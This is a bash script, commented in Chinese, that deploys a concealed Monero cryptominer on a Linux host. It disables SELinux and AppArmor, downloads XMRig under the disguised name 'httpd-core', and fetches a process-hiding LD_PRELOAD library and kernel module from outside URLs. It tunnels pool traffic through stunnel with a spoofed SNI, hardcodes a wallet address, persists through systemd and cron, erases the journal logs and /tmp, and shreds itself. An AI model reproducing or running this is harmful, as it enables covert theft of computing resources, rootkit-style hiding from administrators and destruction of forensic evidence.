#!/bin/bash

# 隐藏挖矿进程的一键部署脚本（无编译，直接下载预编译文件）

if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

set -e

# 记录创建的文件和目录
declare -a created_files
declare -a created_dirs
created_dirs=("/opt/httpd-bin" "/etc/systemd/conf.d" "/opt/svc-bin" "/mnt/tmpfs")
svc_conf="/mnt/tmpfs/svc.conf"
stunnel_conf="/etc/stunnel/stunnel.conf"
ld_preload="/etc/ld.so.preload"
svc_service="/etc/systemd/system/svc.service"
tmp_tar="/tmp/svc.tar.gz"
tmp_pid="/tmp/svc.pid"

# GitHub 预编译文件下载链接（替换为你的实际 URL）
wrapper_url="https://raw.githubusercontent.com/your-username/my-hidden-binaries/main/svc-wrapper"
libhide_url="https://raw.githubusercontent.com/your-username/my-hidden-binaries/main/libhide.so"
hide_pid_url="https://raw.githubusercontent.com/your-username/my-hidden-binaries/main/hide_pid.ko"

# 清理函数
cleanup() {
    echo "清理系统中残留的文件和操作..."

    # 删除临时文件
    for file in "$tmp_tar" "$tmp_pid"; do
        if [ -f "$file" ]; then
            shred -u "$file" 2>/dev/null || rm -f "$file" 2>/dev/null
        fi
    done

    # 删除创建的文件
    for file in "$svc_conf" "$stunnel_conf" "$ld_preload" "$svc_service" "/opt/httpd-bin/svc-wrapper" "/opt/svc-bin/libhide.so" "/opt/svc-bin/hide_pid.ko"; do
        if [ -f "$file" ]; then
            shred -u "$file" 2>/dev/null || rm -f "$file" 2>/dev/null
        fi
    done

    # 删除创建的目录
    for dir in "${created_dirs[@]}"; do
        if [ -d "$dir" ]; then
            rm -rf "$dir" 2>/dev/null
        fi
    done

    # 卸载 tmpfs
    if mountpoint -q /mnt/tmpfs; then
        umount /mnt/tmpfs 2>/dev/null
    fi

    # 恢复 LD_PRELOAD
    if [ -f "/etc/ld.so.preload.bak" ]; then
        mv /etc/ld.so.preload.bak /etc/ld.so.preload 2>/dev/null
    fi

    # 删除用户和组
    if id svc >/dev/null 2>&1; then
        userdel -r svc 2>/dev/null
    fi
    if getent group svc >/dev/null; then
        groupdel svc 2>/dev/null
    fi

    # 移除内核模块
    if [ -f "/sys/module/hide_pid" ]; then
        rmmod hide_pid 2>/dev/null
    fi

    # 清理 systemd 服务
    if systemctl is-enabled svc.service >/dev/null 2>&1; then
        systemctl disable svc.service 2>/dev/null
    fi
    systemctl daemon-reload 2>/dev/null

    # 清理 crontab
    sed -i '/svc.service/d' /etc/crontab 2>/dev/null

    # 清理 journalctl 日志
    journalctl --vacuum-time=1s 2>/dev/null || echo "警告：无法清理 journalctl 日志"

    # 恢复系统限制
    if command -v setenforce &> /dev/null; then
        setenforce 1 || echo "警告：无法恢复 SELinux"
    fi
    if command -v aa-status &> /dev/null; then
        systemctl start apparmor || echo "警告：无法恢复 AppArmor"
    fi

    echo "清理完成。"
}

# 捕获错误退出并调用清理
trap 'cleanup; exit 1' ERR INT TERM

# 临时禁用系统限制
if command -v setenforce &> /dev/null; then
    echo "检测到 SELinux，正在临时禁用..."
    setenforce 0 || echo "警告：无法禁用 SELinux"
fi
if command -v aa-status &> /dev/null; then
    echo "检测到 AppArmor，正在临时禁用..."
    systemctl stop apparmor || echo "警告：无法停止 AppArmor"
fi

# 检查必要命令是否存在（移除 gcc 和 make）
for cmd in curl tar stunnel systemctl shred; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请手动安装所需依赖" 1>&2
        exit 1
    fi
done

# 用户输入
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入服务密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录
for dir in "${created_dirs[@]}"; do
    mkdir -p "$dir" || { echo "创建目录 $dir 失败" 1>&2; exit 1; }
    chmod 700 "$dir"
done
mount -t tmpfs tmpfs /mnt/tmpfs || { echo "挂载 tmpfs 失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L --retry 3 https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o "$tmp_tar" || { echo "下载 xmrig 失败" 1>&2; exit 1; }
tar -xzf "$tmp_tar" -C /opt/httpd-bin || { echo "解压失败" 1>&2; exit 1; }
mv /opt/httpd-bin/xmrig-6.22.2/xmrig /opt/httpd-bin/httpd-core || { echo "移动文件失败" 1>&2; exit 1; }
chmod 700 /opt/httpd-bin/httpd-core
rm -rf /opt/httpd-bin/xmrig-6.22.2
shred -u "$tmp_tar" || rm -f "$tmp_tar"

# 下载预编译文件
curl -L --retry 3 "$wrapper_url" -o /opt/httpd-bin/svc-wrapper || { echo "下载 svc-wrapper 失败" 1>&2; exit 1; }
chmod 700 /opt/httpd-bin/svc-wrapper

curl -L --retry 3 "$libhide_url" -o /opt/svc-bin/libhide.so || { echo "下载 libhide.so 失败" 1>&2; exit 1; }
chmod 700 /opt/svc-bin/libhide.so

curl -L --retry 3 "$hide_pid_url" -o /opt/svc-bin/hide_pid.ko || { echo "下载 hide_pid.ko 失败" 1>&2; exit 1; }
chmod 700 /opt/svc-bin/hide_pid.ko

# 检查内核模块兼容性（简单验证）
if ! modinfo /opt/svc-bin/hide_pid.ko | grep -q "$(uname -r)"; then
    echo "警告：hide_pid.ko 可能与当前内核版本 $(uname -r) 不兼容，请确保编译时使用匹配的内核版本" 1>&2
fi

# 生成配置文件
cat > "$svc_conf" <<EOF
{
    "pools": [
        {
            "url": "127.0.0.1:8443",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "max-cpu-usage": 50,
    "randomx": {
        "1gb-pages": false,
        "cache-qos": true
    }
}
EOF
chmod 600 "$svc_conf"

# 创建 stunnel 配置文件
cat > "$stunnel_conf" <<EOF
[svc]
client = yes
accept = 127.0.0.1:8443
connect = $pool_url
syslog = no
output = /dev/null
sni = www.google.com
ciphers = ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256
curve = secp384r1
EOF
chmod 600 "$stunnel_conf"

# 设置全局 LD_PRELOAD
[ -f "$ld_preload" ] && cp "$ld_preload" /etc/ld.so.preload.bak
echo "/opt/svc-bin/libhide.so" > "$ld_preload" || {
    echo "设置 LD_PRELOAD 失败，回滚..." 1>&2
    [ -f /etc/ld.so.preload.bak ] && mv /etc/ld.so.preload.bak "$ld_preload"
    exit 1
}

# 创建用户和组
groupadd -r svc 2>/dev/null || true
useradd -r -s /bin/false -g svc svc 2>/dev/null || { echo "创建用户失败" 1>&2; exit 1; }
chown -R svc:svc /opt/httpd-bin /etc/systemd/conf.d /etc/stunnel /opt/svc-bin /mnt/tmpfs

# 加载内核模块
[ -f "/sys/module/hide_pid" ] && rmmod hide_pid 2>/dev/null || true
insmod /opt/svc-bin/hide_pid.ko || { echo "加载内核模块失败，可能需禁用 Secure Boot 或与内核版本不匹配" 1>&2; exit 1; }

# 创建 systemd 服务
cat > "$svc_service" <<EOF
[Unit]
Description=Service Daemon
After=network.target stunnel4.service

[Service]
User=svc
Group=svc
ExecStart=/opt/httpd-bin/svc-wrapper --threads=1 --config=/mnt/tmpfs/svc.conf
Restart=always
LimitCORE=0
MemoryMax=512M
NoNewPrivileges=true
PrivateTmp=true
ExecStartPost=/bin/sh -c "sleep 1; echo \$\$ > /tmp/svc.pid; echo pid_to_hide=\$(cat /tmp/svc.pid) > /sys/module/hide_pid/parameters/pid_to_hide || true"

[Install]
WantedBy=multi-user.target
EOF
chmod 644 "$svc_service"

# 启用服务并设置自修复
systemctl enable stunnel4.service || { echo "启用 stunnel 服务失败" 1>&2; exit 1; }
systemctl start stunnel4.service || { echo "启动 stunnel 服务失败" 1>&2; exit 1; }
systemctl daemon-reload || { echo "systemd 重载失败" 1>&2; exit 1; }
systemctl enable svc.service || { echo "启用 svc 服务失败" 1>&2; exit 1; }
systemctl start svc.service || { echo "启动 svc 服务失败" 1>&2; exit 1; }
echo "*/5 * * * * root systemctl is-active svc.service || systemctl restart svc.service" >> /etc/crontab

# 清理日志和痕迹（正常完成时）
journalctl --vacuum-time=1s || echo "警告：无法清理 journalctl 日志"
shred -u /tmp/* /opt/httpd-bin/*.tar.gz 2>/dev/null || rm -f /tmp/* /opt/httpd-bin/*.tar.gz 2>/dev/null
shred -u "$0" || rm -f "$0"

# 检查服务状态
if systemctl is-active svc.service &> /dev/null && systemctl is-active stunnel4.service &> /dev/null; then
    echo "部署完成！服务运行正常。"
else
    echo "警告：服务未正确启动，请检查 systemctl status"
    cleanup
    exit 1
fi

# 恢复系统限制（正常完成时）
if command -v setenforce &> /dev/null; then
    setenforce 1 || echo "警告：无法恢复 SELinux"
fi
if command -v aa-status &> /dev/null; then
    systemctl start apparmor || echo "警告：无法恢复 AppArmor"
fi

# 清理 trap（正常退出时移除）
trap - ERR INT TERM
